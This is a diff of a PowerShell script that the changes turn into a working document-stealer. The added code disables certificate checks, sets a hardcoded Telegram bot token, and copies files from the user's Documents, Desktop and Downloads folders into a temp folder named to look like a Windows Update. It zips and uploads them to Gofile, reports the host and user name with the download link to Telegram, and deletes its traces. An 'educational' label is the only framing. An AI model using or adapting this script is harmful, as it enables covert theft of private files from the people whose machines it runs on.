@@ -1,28 +1,44 @@
-# collector.ps1 - File Collection Script
+# Telegram Bot Exfiltration Script
 # WARNING: FOR EDUCATIONAL/DEFENSIVE SECURITY PURPOSES ONLY
 
-# Define what files to look for
+# Fix SSL/TLS issues
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+add-type @"
+    using System.Net;
+    using System.Security.Cryptography.X509Certificates;
+    public class TrustAllCertsPolicy : ICertificatePolicy {
+        public bool CheckValidationResult(
+            ServicePoint srvPoint, X509Certificate certificate,
+            WebRequest request, int certificateProblem) {
+            return true;
+        }
+    }
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+
+# Telegram Bot Configuration
+$TELEGRAM_BOT_TOKEN = '8357079658:AAHH8yeCG7eETLPdEqYvhFwlEtaeD36O2Dc'
+$TELEGRAM_CHAT_ID = '5302173301'
+
+# ============================================
+# FILE COLLECTION SECTION
+# ============================================
+
 $targetExtensions = @("*.pdf", "*.docx", "*.xlsx", "*.txt", "*.pptx")
 
-# Define where to search
 $searchPaths = @(
     "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Desktop",
     "$env:USERPROFILE\Downloads"
 )
 
-# Keywords to identify sensitive files
-$sensitiveKeywords = @("password", "confidential", "secret", "budget", "salary", "financial", "credentials")
-
-# Create temporary staging folder
 Write-Host "[*] Creating staging directory..." -ForegroundColor Yellow
 $randomNumber = Get-Random -Minimum 1000 -Maximum 9999
 $stagingDir = "$env:TEMP\WindowsUpdate_$randomNumber"
 New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
-Write-Host "[+] Staging directory created: $stagingDir" -ForegroundColor Green
 
-# Search and collect files
-Write-Host "[*] Searching for sensitive files..." -ForegroundColor Yellow
+Write-Host "[*] Searching for files..." -ForegroundColor Yellow
 $fileCount = 0
 
 foreach ($path in $searchPaths) {
@@ -33,7 +49,6 @@ foreach ($path in $searchPaths) {
             $foundFiles = Get-ChildItem -Path $path -Filter $extension -Recurse -ErrorAction SilentlyContinue
             
             foreach ($file in $foundFiles) {
-                # Collect all files with target extensions
                 Copy-Item -Path $file.FullName -Destination $stagingDir -ErrorAction SilentlyContinue
                 $fileCount++
                 Write-Host "[+] Collected: $($file.Name)" -ForegroundColor Green
@@ -44,13 +59,14 @@ foreach ($path in $searchPaths) {
 
 Write-Host "[+] Total files collected: $fileCount" -ForegroundColor Green
 
-# Compress collected files if any were found
+# ============================================
+# COMPRESSION & UPLOAD
+# ============================================
+
 if ($fileCount -gt 0) {
     Write-Host "[*] Compressing collected files..." -ForegroundColor Yellow
     
-    $downloadsPath = "$env:USERPROFILE\Downloads"
-    $zipFile = "$downloadsPath\saved_files.zip"
-    
+    $zipFile = "$env:TEMP\saved_files_$randomNumber.zip"
     Compress-Archive -Path "$stagingDir\*" -DestinationPath $zipFile -Force
     
     $zipSize = (Get-Item $zipFile).Length / 1MB
@@ -59,9 +75,61 @@ if ($fileCount -gt 0) {
     Write-Host "[+] Archive created: $zipFile" -ForegroundColor Green
     Write-Host "[+] Archive size: $zipSizeRounded MB" -ForegroundColor Green
     
-    # Clean up staging directory
+    # Upload to Gofile
+    Write-Host "[*] Uploading to file host..." -ForegroundColor Yellow
+    
+    try {
+        $uploadUrl = "https://upload.gofile.io/uploadfile"
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
+        
+        $response = $webClient.UploadFile($uploadUrl, "POST", $zipFile)
+        $responseText = [System.Text.Encoding]::UTF8.GetString($response)
+        $jsonResponse = $responseText | ConvertFrom-Json
+        
+        if ($jsonResponse.status -eq 'ok') {
+            $downloadLink = $jsonResponse.data.downloadPage
+            Write-Host "[+] Upload successful!" -ForegroundColor Green
+            
+            # Send notification via Telegram
+            Write-Host "[*] Sending Telegram notification..." -ForegroundColor Yellow
+            
+            $computerName = $env:COMPUTERNAME
+            $userName = $env:USERNAME
+            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            
+            # Format message
+            $message = "🔔 *New Data Package*`n`n"
+            $message += "🖥️ *Computer:* ``$computerName```n"
+            $message += "👤 *User:* ``$userName```n"
+            $message += "📊 *Files:* $fileCount files`n"
+            $message += "💾 *Size:* $zipSizeRounded MB`n"
+            $message += "⏰ *Time:* $timestamp`n`n"
+            $message += "🔗 *Download:* $downloadLink"
+            
+            # URL encode the message
+            $encodedMessage = [System.Uri]::EscapeDataString($message)
+            
+            # Send via Telegram API
+            $telegramUrl = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=$encodedMessage&parse_mode=Markdown"
+            
+            $webClient2 = New-Object System.Net.WebClient
+            $result = $webClient2.DownloadString($telegramUrl)
+            
+            Write-Host "[+] Telegram notification sent!" -ForegroundColor Green
+            
+        } else {
+            Write-Host "[-] Upload failed" -ForegroundColor Red
+        }
+    }
+    catch {
+        Write-Host "[-] Error: $_" -ForegroundColor Red
+    }
+    
+    # Cleanup
     Write-Host "[*] Cleaning up..." -ForegroundColor Yellow
     Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
     Write-Host "[+] Cleanup completed" -ForegroundColor Green
     
 } else {
@@ -69,4 +137,4 @@ if ($fileCount -gt 0) {
     Remove-Item -Path $stagingDir -Force -ErrorAction SilentlyContinue
 }
 
-Write-Host "[*] Collection completed" -ForegroundColor Cyan
+Write-Host "[*] Operation completed" -ForegroundColor Cyan
